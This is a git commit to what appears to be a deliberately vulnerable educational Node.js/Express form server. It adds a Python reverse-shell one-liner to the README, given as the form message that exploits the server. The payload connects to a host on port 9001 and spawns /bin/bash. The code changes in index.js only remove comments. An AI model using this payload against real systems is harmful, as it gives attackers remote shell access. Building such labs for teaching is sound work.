c6bb7fa1909b0950cd9000a71ddf16be773d70c1
mohamad khawam <khawammohamad99@gmail.com>
2023-11-28 15:12:24 -0500

    updating readme

--- README.md
+++ README.md
@@ -3,3 +3,11 @@
 This server is meant for educational purposes and not for deployment.
 
 There is a vulnerability hard coded into the server. 
+
+
+
+Posting form with message 
+
+```bash
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.168",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+```
--- index.js
+++ index.js
@@ -7,25 +7,22 @@ const child_process = require("node:child_process");
 const utils = require('util')
 const exec = utils.promisify(child_process.exec);
 
-// Use body-parser middleware to parse form data
 app.use(bodyParser.urlencoded({ extended: false }));
 
 app.use(express.static("./public"))
 
-// Serve HTML form
 app.get('/', (req, res) => {
   res.sendFile(__dirname + '/pages/index.html');
 });
 let forms = [];
 
 
-// Handle form submission
 app.post('/submit', (req, res) => {
   const formData = req.body;
-  // Process the form data (you can add your logic here)
-    forms.push(req.body)
-  // Respond with a confirmation message
-  res.redirect("/success");
+
+  forms.push(req.body)
+
+    res.redirect("/success");
 });
 
 app.get('/success', (req, res) => {
@@ -34,7 +31,6 @@ app.get('/success', (req, res) => {
 
 app.get('/forms', (req, res) => {
 
-    // Respond with a confirmation message
     res.json(forms);
   });
 
